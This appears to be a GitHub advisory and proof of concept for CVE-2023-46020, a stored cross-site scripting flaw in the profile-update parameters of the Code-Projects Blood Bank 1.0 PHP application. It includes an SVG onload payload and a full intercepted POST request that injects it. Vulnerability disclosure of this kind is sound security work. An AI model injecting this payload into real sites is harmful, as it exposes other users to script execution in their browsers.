# CVE-2023-46020-Code-Projects-Blood-Bank-1.0-Stored-Cross-Site-Scripting-Vulnerability
+ Exploit Author: ersinerenler
# Vendor Homepage
+ https://code-projects.org/blood-bank-in-php-with-source-code
# Software Link
+ https://download-media.code-projects.org/2020/11/Blood_Bank_In_PHP_With_Source_code.zip
# Overview
+ Code-Projects Blood Bank V1.0 is susceptible to a critical security vulnerability involving Stored Cross-Site Scripting (XSS) through multiple parameters (rename, remail, rphone, and rcity) in the /updateprofile.php file. The application fails to adequately sanitize user-supplied data, allowing attackers to inject malicious scripts into the application. This could lead to the execution of arbitrary script code in the browsers of unsuspecting users, potentially compromising their security and privacy within the context of the affected site.
# Vulnerability Details
+ CVE ID: CVE-2023-46020
+ Affected Version: Blood Bank V1.0
+ Vulnerable File: updateprofile.php
+ Parameters: rename, remail, rphone, rcity
+ Attack Type: local
# References:
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46020
+ https://nvd.nist.gov/vuln/detail/CVE-2023-46020
# Description
+ The parameters rename, remail, rphone, and rcity in the /file/updateprofile.php file of Code-Projects Blood Bank V1.0 are susceptible to Stored Cross-Site Scripting (XSS). This vulnerability arises due to insufficient input validation and sanitation of user-supplied data. An attacker can exploit this weakness by injecting malicious scripts into these parameters, which, when stored on the server, may be executed when other users view the affected user's profile.
# Proof of Concept (PoC) : 
+ Intercept the POST request to updateprofile.php via Burp Suite
+ Inject the payload to the vulnerable parameters
+ Payload: `"><svg/onload=alert(document.domain)>`
+ Example request for `rname` parameter
```
POST /bloodbank/file/updateprofile.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Origin: http://localhost
Connection: close
Referer: http://localhost/bloodbank/rprofile.php?id=1
Cookie: PHPSESSID=<some-cookie-value>
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

rname=test"><svg/onload=alert(document.domain)>&remail=test%40gmail.com&rpassword=test&rphone=8875643456&rcity=lucknow&bg=A%2B&update=Update
```
+ Go to the profile page and trigger the XSS
<img width="1447" alt="image" src="https://github.com/ersinerenler/CVE-2023-46020-Code-Projects-Blood-Bank-1.0-Stored-Cross-Site-Scripting-Vulnerability/assets/113091631/d579130a-0668-4cce-b76b-b7919e019c9d">
